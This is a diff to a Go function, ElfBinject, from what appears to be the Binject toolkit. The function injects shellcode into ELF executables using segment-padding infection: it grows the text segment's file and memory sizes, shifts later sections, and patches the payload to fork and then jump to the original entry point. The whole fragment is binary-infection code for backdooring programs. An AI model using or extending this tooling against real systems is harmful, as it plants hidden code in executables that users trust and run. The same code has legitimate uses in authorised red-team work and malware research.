@@ -4,6 +4,7 @@ import (
 	"errors"
 	"io/ioutil"
 	"log"
+	"sort"
 
 	"github.com/Binject/debug/elf"
 	"github.com/Binject/shellcode/api"
@@ -64,7 +65,7 @@ func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config
 	*/
 
 	PAGE_SIZE := uint64(4096)
-	newOffset := uint64(0)
+	scAddr := uint64(0)
 	sclen := uint64(0)
 	shellcode := []byte{}
 
@@ -102,31 +103,38 @@ func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config
 				// functions, but this falls into the second case above, since .ctors
 				// are actually run by DT_INIT code.
 				// from positron/elfhack
+
 			default:
 				return errors.New("Unknown Executable Type: " + string(elfFile.FileHeader.Type))
 			}
 
 			// 7. Patch the insertion code (parasite) to jump to the entry point (original)
-			shellcode = api.ApplyPrefixForkIntel64(userShellCode, uint32(originalEntry-elfFile.FileHeader.Entry-7), elfFile.ByteOrder)
+			shellcode = api.ApplyPrefixForkIntel64(userShellCode, uint32(originalEntry), elfFile.ByteOrder)
 			sclen = uint64(len(shellcode))
+
+			log.Println("Shellcode Length: ", sclen)
 
 			// -Increase p_filesz to account for the new code (parasite)
 			p.Filesz += sclen
 			// -Increase p_memsz to account for the new code (parasite)
 			p.Memsz += sclen
 
-			newOffset = p.Off + p.Filesz
+			scAddr = p.Off + p.Filesz
 			afterTextSegment = true
 		}
 	}
 
 	//	3. For the last shdr in the text segment
-	for _, s := range elfFile.Sections {
-		if s.Offset >= newOffset {
+	sortedSections := elfFile.Sections[:]
+	sort.Slice(sortedSections, func(a, b int) bool { return elfFile.Sections[a].Offset < elfFile.Sections[b].Offset })
+	for _, s := range sortedSections {
+
+		if s.Addr > scAddr {
 			// 4. For each shdr which is after the insertion
 			//	-Increase sh_offset by PAGE_SIZE
 			s.Offset += PAGE_SIZE
-		} else if s.Size+s.Addr == elfFile.FileHeader.Entry { // assuming entry was set to (p_vaddr + p_filesz) above
+
+		} else if s.Size+s.Addr == scAddr { // assuming entry was set to (p_vaddr + p_filesz) above
 			//	-increase sh_len by the parasite length
 			s.Size += sclen
 		}
